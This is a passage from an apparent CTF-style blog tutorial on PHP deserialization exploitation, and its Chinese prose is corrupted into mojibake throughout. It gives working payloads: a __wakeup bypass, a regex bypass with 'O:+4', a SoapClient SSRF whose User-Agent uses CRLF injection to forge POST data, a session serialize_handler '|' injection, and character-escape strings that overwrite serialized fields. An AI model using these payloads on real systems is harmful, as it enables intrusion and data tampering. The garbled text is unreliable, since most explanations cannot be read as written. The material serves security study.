</code>æ‰“å°æ—¶ä¼šè§¦å‘</li><li>ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶</li><li>ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶</li><li>ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ<code>==</code>æ¯”è¾ƒæ—¶ï¼ˆ<code>PHP</code>è¿›è¡Œ<code>==</code>æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰</li><li>ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–<code>SQL</code>è¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶</li><li>ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡<code>php</code>å­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ <code>strlen()</code>ã€<code>addslashes()</code>æ—¶</li><li>åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰<code>toString</code>è¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™<code>toString</code>ä¼šè¢«è°ƒç”¨</li><li>ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º class_exists() çš„å‚æ•°çš„æ—¶å€™</li></ol><h1 id="å…³äºç»•è¿‡çš„Trick"><a href="#å…³äºç»•è¿‡çš„Trick" class="headerlink" title="å…³äºç»•è¿‡çš„Trick"></a>å…³äºç»•è¿‡çš„Trick</h1><h2 id="ç»•è¿‡-wake"><a href="#ç»•è¿‡-wake" class="headerlink" title="ç»•è¿‡__wake()"></a>ç»•è¿‡__wake()</h2><blockquote><p>ç‰ˆæœ¬:<br>php 5&lt; 5.6.25<br>php 7&gt; 7.0.10</p></blockquote><p>åˆ©ç”¨æ–¹æ³•:<strong>å½“åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„å±æ€§ä¸ªæ•°å¤§äºç±»ä¸­å®é™…çš„å±æ€§ä¸ªæ•°æ—¶, å°±ä¼šè·³è¿‡__wake()å‡½æ•°</strong></p><h2 id="ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼"><a href="#ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼"></a>ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼</h2><ol><li><p>åŠ å·ç»•è¿‡, åœ¨ååºåˆ—åŒ–çš„æ—¶å€™, æ•°å­—å‰é¢çš„åŠ å·ä¼šè¢«å½“æˆæ˜¯æ­£å·è€Œæ­£åˆ™åŒ¹é…çš„æ—¶å€™åˆ™ä¸ä¼šè¿™æ ·è¯†åˆ«</p><p>æ¯”å¦‚è¯´<code>O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;</code>, æœ‰æ—¶å€™é¢˜ç›®ä¼šé€šè¿‡æ­£åˆ™<code>O\:\d</code>æ¥åŒ¹é…<code>O:4</code>, è¿™æ—¶å°†åºåˆ—æ”¹<br>æˆ<code>O:+4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;</code>å°±èƒ½ç»•è¿‡è¯¥åŒ¹é…</p></li></ol><h2 id="å˜é‡å¼•ç”¨"><a href="#å˜é‡å¼•ç”¨" class="headerlink" title="å˜é‡å¼•ç”¨"></a>å˜é‡å¼•ç”¨</h2><p>åˆ©ç”¨å˜é‡å¼•ç”¨ä½¿å¾—ç±»ä¸­ä¸¤ä¸ªå˜é‡å§‹ç»ˆç›¸ç­‰</p><h1 id="phpåŸç”Ÿç±»ååºåˆ—åŒ–"><a href="#phpåŸç”Ÿç±»ååºåˆ—åŒ–" class="headerlink" title="phpåŸç”Ÿç±»ååºåˆ—åŒ–"></a>phpåŸç”Ÿç±»ååºåˆ—åŒ–</h1><h2 id="SoapClientååºåˆ—åŒ–åˆ©ç”¨"><a href="#SoapClientååºåˆ—åŒ–åˆ©ç”¨" class="headerlink" title="SoapClientååºåˆ—åŒ–åˆ©ç”¨"></a>SoapClientååºåˆ—åŒ–åˆ©ç”¨</h2><h3 id="æ¦‚è¿°-1"><a href="#æ¦‚è¿°-1" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>phpå®‰è£…<code>php-soap</code>æ‰©å±•ä¹‹å, å¯ä»¥ååºåˆ—åŒ–åŸç”Ÿç±»<code>SoapClient</code>, æ¥å‘é€<code>http post</code>è¯·æ±‚æ¥å®ç°<code>SSRF</code><br>é€šè¿‡ååºåˆ—åŒ–<code>SoapClient</code>å¯¹è±¡åè°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•è§¦å‘<code>__call()</code>æ–¹æ³•<br>è¿™ä¸ª<code>__call()</code>æ–¹æ³•ä¼šå‘æŒ‡å®š<code>URL</code>å‘é€<code>HTTPÂ POST</code>è¯·æ±‚, å› ä¸º<code>User-Agent</code>å­—æ®µå¯æ§, æ‰€ä»¥å¯ä»¥é€šè¿‡<code>CRLF</code>æ¥æ„é€ è¯·æ±‚å¤´å®ç°è‡ªå®šä¹‰<code>POSTÂ DATA</code></p><p>å¦‚æœè¦åœ¨è‡ªå·±çš„ç¯å¢ƒå¤ç°åˆ™éœ€è¦æ›´æ”¹<code>php.ini</code>ä¸­çš„<code>extension=soap</code></p><h3 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h3><p>ä¸¾ä¸ªæ —å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/test.php&quot;</span>;</span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;kirito-zbds&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">NULL</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="variable">$target</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;k1rit0&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line">    <span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> -&gt; tan90_function();</span><br></pre></td></tr></table></figure><p>å½“<code>SoapClient</code>å¯¹è±¡è¢«é€†åºåˆ—åŒ–å‡ºæ¥å¹¶è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„<code>tan90_function()</code>æ–¹æ³•æ—¶.<code>__call()</code>æ–¹æ³•ä¼šå‘<code>location</code>ä¹Ÿå°±æ˜¯<code>http://127.0.0.1/test.php</code>å‘é€ä¸€ä¸ª<code>HTTPÂ POST</code>è¯·æ±‚, è€Œè¯·æ±‚å¤´ä¸­ä¼šæœ‰:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: kirito-zbds</span><br><span class="line">SOAPAction: k1rit0#tan90_function()    &#x2F;&#x2F; uri + è¢«è°ƒç”¨çš„ä¸å­˜åœ¨çš„å‡½æ•°å</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°, è¯·æ±‚å¤´ä¸­çš„è¿™äº›å­—æ®µä¼šå˜æˆå¯æ§çš„, ä½†è¿™æ ·åªèƒ½é€šè¿‡å†…ç½‘è®¿é—®<code>test.php</code>, å¹¶ä¸èƒ½ä»»æ„<code>POST</code>æ•°æ®. è¦æƒ³<code>POST</code>æ•°æ®, å°±è¦ç”¨åˆ°<code>CRLF</code>äº†.</p><h4 id="ä»€ä¹ˆæ˜¯CRLF"><a href="#ä»€ä¹ˆæ˜¯CRLF" class="headerlink" title="ä»€ä¹ˆæ˜¯CRLF"></a>ä»€ä¹ˆæ˜¯CRLF</h4><p><code>CRLF</code>å°±æ˜¯<code>\r\n</code>çš„ç¼©å†™, <code>HTTP</code>åè®®ä¸­<code>header</code>ä¹‹é—´æ˜¯ç”¨ä¸€ä¸ª<code>\r\n</code>æ¥åˆ†éš”çš„, è€Œ<code>HTTP header</code>å’Œ<code>HTTP body</code>ä¹‹é—´æ˜¯ç”¨<code>\r\n\r\n</code>ä¹Ÿå°±æ˜¯ä¸¤ä¸ª<code>\r\n</code>æ¥åˆ†å‰²çš„. å¦‚æœè¯·æ±‚å¤´ä¸­çš„å­—æ®µå¯æ§, é‚£ä¹ˆå¯ä»¥æ‰‹åŠ¨æ·»åŠ <code>\r\n</code>ç”¨ä»¥åœ¨è¯·æ±‚ä¸­æ·»åŠ å­—æ®µç”šè‡³æ˜¯æ·»åŠ <code>HTTPÂ body</code>ç”¨ä»¥<code>POSTÂ data</code>. </p><p>æ¯”å¦‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­, æˆ‘ä»¬æŠŠ<code>$ua</code>æ”¹ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;kirito-zbds\r\nContent-Type:application-www-form-urlencoded\r\nContent-Length:17\r\n\r\ndata=this_is_data&quot;</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆ<code>HTTPÂ POST</code>çš„è¯·æ±‚å¤´ä¸­å°±ä¼šå‡ºç°è¿™ä¹ˆä¸€ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: kirito-zbds</span><br><span class="line">Content-Type: application-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">data&#x3D;this_is_data</span><br><span class="line">SOAPAction: k1rit0#tan90_function()</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æˆåŠŸä¼ªé€ å‡º<code>HTTPÂ POST</code>è¯·æ±‚å¹¶ä¼ è¾“å‚æ•°äº†</p><h1 id="php-sessionååºåˆ—åŒ–"><a href="#php-sessionååºåˆ—åŒ–" class="headerlink" title="php-sessionååºåˆ—åŒ–"></a>php-sessionååºåˆ—åŒ–</h1><p>åˆæ˜¯<code>session</code>, ä¸Šæ¬¡åœ¨æ–‡ä»¶åŒ…å«ä¹Ÿæœ‰<code>session</code>, å…¶å®è¿™é‡Œçš„ååºåˆ—åŒ–ä¹Ÿè¦ç”¨åˆ°é‚£è¾¹çš„çŸ¥è¯†</p><h2 id="æ¦‚è¿°-2"><a href="#æ¦‚è¿°-2" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><h3 id="å…³äºsession-upload-progress"><a href="#å…³äºsession-upload-progress" class="headerlink" title="å…³äºsession.upload_progress"></a>å…³äº<code>session.upload_progress</code></h3><p>è¿™ä¸ª<code>php-session</code>ååºåˆ—åŒ–å…¶å®è·Ÿ<code>session.uplaod_progress</code>æœ‰å…³, è¯¦ç»†çš„å¯ä»¥çœ‹æ–‡ä»¶åŒ…å«é‚£éƒ¨åˆ†çš„ç¬”è®°<br>è¿™é‡Œåªç®€å•çš„è¯´ä¸€ä¸‹, æœåŠ¡ç«¯çš„<code>php.ini</code>é»˜è®¤é…ç½®<code>session.use_strict_mode = 0</code>, è¿™æ ·ç”¨æˆ·å¯ä»¥è‡ªå·±è®¾ç½®<br><code>Cookies:Â PHPSESSID =Â xxxxxx</code>, æœåŠ¡ç«¯å°†ä¼šåˆ›å»ºä¸€ä¸ª<code>/tmp/sess_xxxxxx</code>æ–‡ä»¶</p><p>å¹¶ä¸”, å¦‚æœç”¨æˆ·å‘æœåŠ¡ç«¯ä¼ é€æ–‡ä»¶, é‚£ä¹ˆæœåŠ¡ç«¯å°†ä¼šåœ¨<code>/tmp/sess_xxxxxx</code>ä¸­å†™å…¥ä¸Šä¼ è¿›åº¦, æœ€é‡è¦çš„æ˜¯. å¦‚æœç”¨æˆ·çš„<br><code>POSTÂ DATA</code>ä¸­å«æœ‰<code>PHP_SESSION_UPLOAD_PROGRESS=xxx</code>, é‚£ä¹ˆæœåŠ¡ç«¯å°†ä¼šåœ¨<code>/tmp/sess_xxxxxx</code>ä¸­å†™å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_xxx | ä¸Šä¼ è¿›åº¦</span><br></pre></td></tr></table></figure><h3 id="å…³äºsession-serialize-handler"><a href="#å…³äºsession-serialize-handler" class="headerlink" title="å…³äºsession.serialize_handler"></a>å…³äº<code>session.serialize_handler</code></h3><p>åœ¨æ‰§è¡Œ<code>php</code>ä»£ç æ—¶å¯ä»¥è®¾ç½®è¿™ä¹ˆä¸¤ä¸ªä¸œè¥¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè®¾ç½®çš„æ˜¯phpå¤„ç†<code>session</code>çš„æ–¹å¼,<code>php</code>æˆ–<code>php_serialize</code>. é»˜è®¤æ˜¯<code>php</code><br>è¿™ä¸¤ä¸ªæ–¹å¼çš„ä¸åŒå°±åœ¨äº, å­˜å–<code>session</code>æ–‡ä»¶çš„æ ¼å¼ä¸åŒ.<br>ä¸‹é¢ä»ä¸€ä¸ªä¾‹å­æ¥è¯¦ç»†çš„çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªæ–¹å¼çš„åŒºåˆ«</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">// ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;k1rit0&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure><p><code>php</code>æ–¹å¼çš„å­˜å–çš„æ ¼å¼æ˜¯:<code>é”®å|serialize_string</code>, å½“æˆ‘ä¼ <code>?a=a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;</code><br><code>session</code>æ–‡ä»¶ä¸­å­˜çš„æ˜¯<code>k1rit0|s:45:&quot;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;&quot;;</code></p><p>è€Œå¦‚æœç”¨çš„æ˜¯<code>php_serialize</code>æ–¹å¼,å­˜å–çš„æ ¼å¼å°±æ˜¯<code>serialize_string</code>, <code>session</code>æ–‡ä»¶ä¸­å­˜çš„ä¾¿æ˜¯<br><code>a:1:&#123;s:6:&quot;k1rit0&quot;;s:45:&quot;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;&quot;;&#125;</code></p><h2 id="åˆ©ç”¨æ–¹æ³•-1"><a href="#åˆ©ç”¨æ–¹æ³•-1" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h2><p>æ ¹æ®ä¸Šé¢çš„ä¸¤ä¸ª<code>session</code>å­˜å–æ–¹æ³•, å¦‚æœæˆ‘ä»¬å…ˆä»¥<code>php_serialize</code>å‚¨å­˜ å†æŒ‰<code>php</code>çš„æ–¹å¼è¯»å–, å°±å¯ä»¥ååºåˆ—åŒ–ä¸€äº›æ¶æ„çš„åºåˆ—. å°±æ‹¿ä¸Šé¢çš„ä¾‹å­æ¥è¯´, å…ˆä»¥<code>php_serialize</code>å‚¨å­˜<code>?a=|a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;</code>,æ³¨æ„é‚£ä¸ª<code>|</code></p><p>è¿™ä¸ªæ—¶å€™æ¥çœ‹çœ‹<code>session</code>é‡Œæ˜¯å•¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:6:&quot;k1rit0&quot;;s:46:&quot;|a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœè¿™ä¸ªæ—¶å€™, æŒ‰<code>php</code>çš„æ–¹å¼è¯»å–è¿™ä¸ª<code>session</code>æ–‡ä»¶, å°±ä¼šè¢«è¯†åˆ«æˆä¸¤éƒ¨åˆ†:</p><ol><li><code>|</code>å‰é¢çš„<code>a:1:&#123;s:6:&quot;k1rit0&quot;;s:46:&quot;</code></li><li><code>|</code>åé¢çš„<code>a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;&quot;;&#125;</code></li></ol><p> <code>|</code>åé¢çš„å‰ä¸€éƒ¨åˆ†``a:2:{s:4:â€nameâ€;s:6:â€kiritoâ€;s:3:â€ageâ€;i:14;}`, ä¼šè¢«è¯†åˆ«æˆä¸€ä¸ªå®Œæ•´çš„åºåˆ—åŒ–ä¸²</p><blockquote><p>è¿™é‡Œæœ‰ä¸ªsession_start()çš„å°çŸ¥è¯†, å¦‚æœphpä»£ç ä¸­å­˜åœ¨session_start()è€Œä¸”å¤„ç†sessionçš„æ–¹å¼æ˜¯php, é‚£ä¹ˆåœ¨æ‰§è¡Œ<br>session_start()æ—¶ä¼šååºåˆ—åŒ–sessionä¸­<code>|</code>åçš„åºåˆ—åŒ–ä¸², å¹¶èµ‹å€¼ç»™$_SESSIONå˜é‡</p></blockquote><p>å¦‚æœ<code>php</code>ä»£ç ä¸­æŸäº›ç±»ä¸­æœ‰<code>__wake()</code>æˆ–<code>__destruct()</code>, å¹¶ä¸”è¿™ä¸¤ä¸ªé­”æ³•å‡½æ•°ä¸­å­˜åœ¨å±é™©çš„å‡½æ•°, åˆ™å¯ä»¥é€šè¿‡<code>session</code>ååºåˆ—åŒ–æ§åˆ¶è¿™äº›å±é™©å‡½æ•°.</p><p>è‡³äºå¦‚ä½•åœ¨<code>session</code>æ–‡ä»¶ä¸­å†™å…¥æ¶æ„åºåˆ—åŒ–ä¸²å‘¢? é‚£å°±è¦ç”¨åˆ°<code>session.upload_progress</code>ä¸­çš„<br><code>PHP_SESSION_UPLOAD_PROGRESS</code>äº†, å…·ä½“æ€ä¹ˆç”¨, å»çœ‹æ–‡ä»¶åŒ…å«é‚£ç¯‡ç¬”è®°å§</p><h1 id="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h1><p>å¦‚æœå­˜åœ¨å¯¹åºåˆ—åŒ–åçš„å­—ç¬¦è¿›è¡Œæ›¿æ¢, å¹¶ä¸”æ›¿æ¢åå­—ç¬¦é•¿åº¦ä¼šå˜, åˆ™æœ‰å¯èƒ½å­˜åœ¨å­—ç¬¦é€ƒé€¸</p><h2 id="æ›¿æ¢åå­—ç¬¦å˜é•¿"><a href="#æ›¿æ¢åå­—ç¬¦å˜é•¿" class="headerlink" title="æ›¿æ¢åå­—ç¬¦å˜é•¿"></a>æ›¿æ¢åå­—ç¬¦å˜é•¿</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> str_replace(<span class="string">&quot;o&quot;</span>, <span class="string">&quot;oo&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚è¯´ä¸Šé¢è¿™ä¸ªå‡½æ•°, æŠŠè¾“å…¥çš„å­—ç¬¦ä¸²ä¸­çš„<code>o</code>æ›¿æ¢æˆ<code>oo</code><br>å¦‚æœæœ‰è¿™ä¹ˆä¸ªæ•°ç»„<code>array(&quot;name&quot; =&gt; &quot;kirito&quot;,&quot;level&quot; =&gt; &quot;18&quot;);</code>,<br>åºåˆ—åŒ–ä¹‹åå°±æ˜¯<code>a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125;</code><br>å†ç”¨ä¸Šé¢çš„å‡½æ•°å¤„ç†åºåˆ—åŒ–å­—ç¬¦ä¸², å°±ä¼šå˜æˆ<code>a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kiritoo&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125;</code>, è¿™é‡Œå°±ä¼šå‡ºç°ä¸€ä¸ªé”™è¯¯<code>s:6:&quot;kiritoo&quot;</code>, é•¿åº¦åº”è¯¥ä¸º6çš„å­—ç¬¦å˜æˆ7äº†</p><p>é€ƒé€¸é€ƒé€¸, ç›®çš„å°±æ˜¯é€ƒå‡ºåŒå¼•å·, å¦‚æœæˆ‘ä»¬çš„æ•°ç»„æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;name&quot;</span> =&gt; <span class="string">&#x27;kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;level&quot;</span> =&gt; <span class="string">&#x27;18&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–ä¹‹åå°±æ˜¯<br><code>a:2:&#123;s:4:&quot;name&quot;;s:55:&quot;kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125;</code></p><p>è¿™é‡Œ<code>name</code>é‡Œé¢æœ¬èº«å°±æœ‰åŒå¼•å·, ä½†æ˜¯ä¸èƒ½å®ç°é€ƒé€¸, æ˜¯å› ä¸ºååºåˆ—åŒ–æ—¶å€™, ä¼šè¯»å–æŒ‡å®šé•¿åº¦çš„å­—ç¬¦åä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯<code>&quot;</code><br>å°±æ¯”å¦‚è¿™é‡Œçš„<code>s:55:&quot;kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;&quot;</code>,<br>è¯»å–55ä¸ªå­—ç¬¦<code>kiritooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;</code>å, å°±å‰©ä¸‹ç»“å°¾çš„<code>&quot;</code>, æ‰€ä»¥ä¸­é—´çš„<code>&quot;</code>å¹¶ä¸å½±å“ååºåˆ—åŒ–</p><p>ä½†å¦‚æœå°†åºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢æ“ä½œ, å°†ä¼šå˜æˆ<br><code>s:55:&quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;</code>, ç°åœ¨å†æ¥çœ‹çœ‹è¯»å–55ä¸ªå­—ç¬¦åæ˜¯å•¥, æˆ‘ä»¬å‘ç°<code>kiritoooooooooooooooooooooooooooooooooooooooooooooooooo</code>åˆšå¥½å°±æ˜¯55ä¸ªå­—ç¬¦, è€Œåé¢åˆšå¥½å°±æ˜¯ä¸€ä¸ª<code>&quot;</code>, è¿™æ„å‘³ç€åœ¨ååºåˆ—åŒ–çš„æ—¶å€™, åé¢çš„<code>;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;</code>åˆ™ä¼šé€ƒé€¸å‡ºå», è¢«è¯†åˆ«æˆåºåˆ—åŒ–å­—ç¬¦ä¸²çš„å¦ä¸€éƒ¨åˆ†.(å…·ä½“åŸå› å°±æ˜¯å› ä¸ºå¤šå‡ºçš„<code>o</code>çš„é•¿åº¦åˆšå¥½å°±æ˜¯<code>&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;</code>)çš„é•¿åº¦</p><p>æœ€å, æˆ‘ä»¬æ¥çœ‹çœ‹æ€»çš„å­—ç¬¦ä¸²å¤„ç†å®Œæ˜¯æ€æ ·çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:&quot;name&quot;;s:55:&quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–æœ‰ä¸ªç‰¹ç‚¹, å½“åˆ¤æ–­ååºåˆ—åŒ–ç»“æŸå, åé¢çš„å­—ç¬¦å°†ä¼šè‡ªåŠ¨å¿½ç•¥, é‚£ä¹ˆè¿™é‡Œååºåˆ—åŒ–å°±ä¼šåªå¤„ç†<br><code>a:2:&#123;s:4:&quot;name&quot;;s:55:&quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;s:5:&quot;level&quot;;s:3:&quot;999&quot;;&#125;</code><br>åé¢çš„<code>&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125;</code>ä¼šè¢«è‡ªåŠ¨å¿½ç•¥, è¿™æ ·æˆ‘ä»¬å°±æˆåŠŸé€šè¿‡æ§åˆ¶<code>name</code>, é€ƒé€¸å¹¶ä¿®æ”¹äº†<code>level</code></p><p>å°†å¤„ç†åçš„å­—ç¬¦ä¸²ååºåˆ—åŒ–çš„ç»“æœ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123; </span><br><span class="line">[&quot;name&quot;]&#x3D;&gt; string(55) &quot;kiritoooooooooooooooooooooooooooooooooooooooooooooooooo&quot; [&quot;level&quot;]&#x3D;&gt; string(3) &quot;999&quot; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><blockquote><p>y4çˆ·çˆ·çš„ååºåˆ—åŒ–æ€»ç»“: <a href="https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161638163316780357284910%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161638163316780357284910&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-14-113588692.pc_v1_rank_blog_v1&amp;utm_term=show">https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161638163316780357284910%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161638163316780357284910&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-14-113588692.pc_v1_rank_blog_v1&amp;utm_term=show</a></p><p>CRLFæ€»ç»“: <a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></p></blockquote>]]></content>
    
    
      
      
